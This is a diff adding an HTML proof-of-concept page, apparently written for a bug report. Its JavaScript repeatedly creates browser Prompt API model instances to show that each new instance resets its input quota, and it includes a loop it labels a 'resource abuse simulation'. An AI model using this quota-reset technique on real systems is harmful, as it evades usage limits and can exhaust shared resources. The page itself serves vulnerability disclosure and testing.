@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Prompt API Quota Bypass PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #log { white-space: pre-wrap; font: 12px/1.4 monospace; border: 1px solid #ccc; padding: 10px; height: 400px; overflow-y: scroll; }
+        .warning { color: #d63384; font-weight: bold; }
+        .success { color: #198754; }
+    </style>
+</head>
+<body>
+    <h2>Prompt API Quota Bypass Demonstration</h2>
+    <p><strong>Expected:</strong> Quota should decrease across model instances</p>
+    <p><strong>Actual:</strong> Each new instance resets quota (vulnerability)</p>
+    <button onclick="runQuotaBypassTest()">Run Quota Bypass Test</button>
+    <div id="log"></div>
+    <script>
+        const log = (msg, className = '') => {
+            const logEl = document.getElementById('log');
+            const line = document.createElement('div');
+            line.textContent = msg;
+            if (className) line.className = className;
+            logEl.appendChild(line);
+            logEl.scrollTop = logEl.scrollHeight;
+        };
+        async function runQuotaBypassTest() {
+            log('=== Quota Bypass Test Starting ===');
+            if (!window.ai || !window.ai.languageModel) {
+                log('❌ Prompt API not available. Enable --enable-features=PromptApiForGeminiNano', 'warning');
+                return;
+            }
+            log('✓ Prompt API detected');
+            const quotaResults = [];
+            let counter = 0;
+            while (counter < 10) {
+                try {
+                    const model = await window.ai.languageModel.create();
+                    const initialQuota = model.inputQuota;
+                    quotaResults.push(initialQuota);
+                    log(`Instance #${++counter}: Initial quota = ${initialQuota}`);
+                    await model.execute('Say "hello" exactly once.');
+                    const remainingQuota = model.inputQuota;
+                    log(`    After execute: remaining = ${remainingQuota}`);
+                    if (remainingQuota >= initialQuota) {
+                        log('    ⚠️ Quota not decremented properly', 'warning');
+                    }
+                } catch (e) {
+                    log(`    ❌ Error: ${e.message}`, 'warning');
+                    break;
+                }
+            }
+            log('\n=== Analysis ===');
+            const allQuotasEqual = quotaResults.every(q => q === quotaResults[0]);
+            if (allQuotasEqual && quotaResults.length > 1) {
+                log('🚨 VULNERABILITY CONFIRMED: All instances start with identical quota', 'warning');
+                log('This allows unlimited resource consumption by creating new instances', 'warning');
+                log(`Repeated quota value: ${quotaResults[0]}`, 'warning');
+            } else {
+                log('✓ Quota properly managed across instances', 'success');
+            }
+            log('\n=== Resource Abuse Simulation ===');
+            let abuseCount = 0;
+            while (abuseCount < 5) {
+                try {
+                    const model = await window.ai.languageModel.create();
+                    await model.execute('Perform a computation-heavy task that should consume quota');
+                    abuseCount++;
+                    log(`Abuse iteration ${abuseCount}: Still able to create and use models`);
+                } catch (e) {
+                    log(`Abuse stopped at iteration ${abuseCount}: ${e.message}`);
+                    break;
+                }
+            }
+            log(`\n⚠️ Completed ${abuseCount} quota bypasses`, 'warning');
+            log('In production, this could lead to resource exhaustion', 'warning');
+        }
+        window.addEventListener('load', () => {
+            if (window.ai) {
+                log('Prompt API detected. Click button to run test.');
+            } else {
+                log('Prompt API not detected. Ensure Chrome Canary with --enable-features=PromptApiForGeminiNano', 'warning');
+            }
+        });
+    </script>
+</body>
+</html> 
